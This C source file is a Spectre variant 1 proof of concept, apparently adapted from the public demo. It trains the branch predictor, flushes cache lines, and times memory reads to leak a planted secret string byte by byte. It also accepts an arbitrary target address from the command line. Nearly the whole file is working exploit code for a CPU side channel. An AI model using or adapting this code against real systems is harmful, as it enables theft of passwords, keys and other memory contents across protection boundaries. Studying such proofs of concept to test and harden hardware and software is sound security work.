#include <stdio.h>
#include <stdint.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#ifndef _MSC_VER
#define sscanf_s sscanf
#endif


/*Target Code*/

unsigned int array1_size = 16; //array1 size assigned
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t array2[256 * 512];

char* secret = "This is the Secret Withdrawn";

uint8_t y = 0;

void target_function(size_t x)
{
	if (x < array1_size)
	{
		y &= array2[array1[x] * 512];
	}
}

/*Exploit Code*/

#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if the time is less than or euqal to the threshold */

/* Report best guess in value[0] and runner-up in value[1] */

void readMemoryByte(size_t hostile_x, uint8_t value[2], int outcome[2])
{

	static int results[256];
	int test, a, b, c, mix_a;
	unsigned int dump = 0;
	size_t training_x, x;
	register uint64_t timer1, timer2;
	volatile uint8_t* address;
	
	for (a = 0; a < 256; a++)
		results[a] = 0;
	for (test = 999; test > 0; test--)
	{
		/* Flush the array2[256*(0..255)] from cache */
		
		
		for (a = 0; a < 256; a++)
			_mm_clflush(&array2[a * 512]); /* intrinsic for cacheflush instruction */

		
		training_x = test % array1_size;
		for (b = 29; b >= 0; b--)
		{
			_mm_clflush(&array1_size);
			for (volatile int m = 0; m < 100; m++)
			{
			} /* Delay (can also mfence) */

			/* Bit twiddling to set x=training_x if j%6!=0 or hostile_x if j%6==0 */
			
			/* Avoid jumps in case those tip off the branch predictor */
			
			x = ((b % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if b%6==0, else x=0 */
			
			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
			
			x = training_x ^ (x & (hostile_x ^ training_x));

			/* Call the victim! */
			target_function(x);
		}

		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		
		for (a = 0; a < 256; a++)
		{
			mix_a = ((a * 167) + 13) & 255;
			
			address = &array2[mix_a * 512];
			
			timer1 = __rdtscp(&dump); /* READ TIMER */
			
			dump = *address; /* MEMORY ACCESS TO TIME */
			
			timer2 = __rdtscp(&dump) - timer1; /* READ TIMER & COMPUTE ELAPSED TIME */
			
			if (timer2 <= CACHE_HIT_THRESHOLD && mix_a != array1[test % array1_size])
				results[mix_a]++; /* cache hit - add +1 to outcome for this value */
		}

		/* Locate highest & second-highest results results tallies in a/b */
		
		b = c = -1;
		
		for (a = 0; a < 256; a++)
		{
			if (b < 0 || results[a] >= results[b])
			{
				c = b;
				
				b = a;
			}
			else if (c < 0 || results[a] >= results[c])
			{
				c = a;
			}
		}
		if (results[b] >= (2 * results[c] + 5) || (results[b] == 2 && results[c] == 0))
			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}
	results[0] ^= dump ; /* use junk so code above won't get optimized out*/
	value[0] = (uint8_t)b;
	outcome[0] = results[b];
	value[1] = (uint8_t)c;
	outcome[1] = results[c];
}

int main(int argc, const char* * argv)
{
	printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));
	size_t hostile_x = (size_t)(secret - (char *)array1); /* default for hostile_x */
	int outcome[2], len = strlen(secret);
	uint8_t value[2];

	for (size_t a = 0; a < sizeof(array2); a++)
		array2[a] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
	if (argc == 3)
	{
		sscanf_s(argv[1], "%p", (void * *)(&hostile_x));
		hostile_x -= (size_t)array1; /* Convert input value into a pointer */
		sscanf_s(argv[2], "%d", &len);
		printf("Trying hostile_x = %p, len = %d\n", (void *)hostile_x, len);
	}

	printf("Reading %d bytes:\n", len);
	while (--len >= 0)
	{
		printf("Reading at hostile_x = %p... ", (void *)hostile_x);
		readMemoryByte(hostile_x++, value, outcome);
		printf("%s: ", (outcome[0] >= 2 * outcome[1] ? "Success" : "Unclear"));
		printf("0x%02X='%c' outcome=%d ", value[0],
		       (value[0] > 31 && value[0] < 127 ? value[0] : '?'), outcome[0]);
		if (outcome[1] > 0)
			printf("(second best: 0x%02X='%c' outcome=%d)", value[1],
				   (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
				   outcome[1]);
		printf("\n");
	}
#ifdef _MSC_VER
	printf("Press ENTER to exit\n");
	getchar();	/* Pause Windows console */
#endif
	return (0);
}
